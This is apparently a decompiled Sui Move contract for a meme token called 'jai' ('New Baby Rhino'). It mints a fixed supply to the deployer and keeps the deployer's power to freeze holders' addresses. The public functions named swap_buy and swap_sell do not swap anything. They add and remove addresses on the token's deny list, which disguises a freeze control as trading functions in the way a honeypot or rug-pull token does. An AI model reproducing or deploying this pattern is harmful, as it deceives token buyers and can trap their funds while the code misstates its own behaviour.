module 0xb7d77e50c0a1a05b1dee6c8ee68c26d172160f2b8c55b2b1c8668b4f233822f7::jai {
    struct JAI has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: JAI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<JAI>(arg0, 9, b"jai", b"New Baby Rhino", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://i.imgur.com/J7n9siV.jpeg"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<JAI>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<JAI>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<JAI>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<JAI>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<JAI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<JAI>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<JAI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<JAI>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

